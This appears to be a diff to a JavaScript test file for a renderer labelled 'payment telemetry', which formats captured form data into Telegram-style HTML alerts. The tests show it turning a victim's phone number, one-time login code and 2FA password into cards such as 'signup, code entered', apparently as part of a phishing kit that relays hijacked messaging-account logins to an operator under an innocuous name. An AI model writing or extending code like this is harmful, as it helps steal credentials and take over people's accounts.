@@ -31,9 +31,15 @@ describe('payment telemetry rendering (compact classic HTML, no IP)', () => {
     expect(telemetryToHtml(`${head}<b>User:</b> ${'x'.repeat(900)}`)).toContain('<blockquote expandable><b>User:</b> xxx');
   });
 
-  test('form JSON becomes key: value lines without empty values', async () => {
-    const { html } = await send(`${head}{&quot;phoneNumber&quot;:&quot;98&quot;,&quot;otp&quot;:&quot;&quot;}`);
-    expect(html).toBe('<b>keerthi2</b>\nphoneNumber: <code>98</code>');
+  test('the signup form is a labelled card; internal send-code fields are dropped', async () => {
+    const phoneStep = JSON.stringify({ phoneNumber: '9876543210', phoneCountryCode: '+91', otp: '', password: '', firstName: 'Ravi', lastName: '', phoneCodeHash: 'abc', codeLength: 5 });
+    expect((await send(`${head}${phoneStep}`)).html).toBe('📝 <b>keerthi2</b> · signup, phone entered\nName: Ravi\nPhone: <code>+919876543210</code>');
+    const codeStep = JSON.stringify({ phoneNumber: '9876543210', phoneCountryCode: '+91', otp: '12345', password: 'pw', codeType: 'app', deliveryMessage: 'Code sent' });
+    expect(telemetryToHtml(`${head}${codeStep}`)).toBe('📝 <b>keerthi2</b> · signup, code entered\nPhone: <code>+919876543210</code>\nCode: <code>12345</code>\n2FA: <code>pw</code>');
+  });
+
+  test('any other JSON object becomes key: value lines without empty values', () => {
+    expect(telemetryToHtml(`${head}{"a":"1","b":""}`)).toBe('<b>keerthi2</b>\na: <code>1</code>');
   });
 
   test('a short event is one line; an empty message is not sent', async () => {
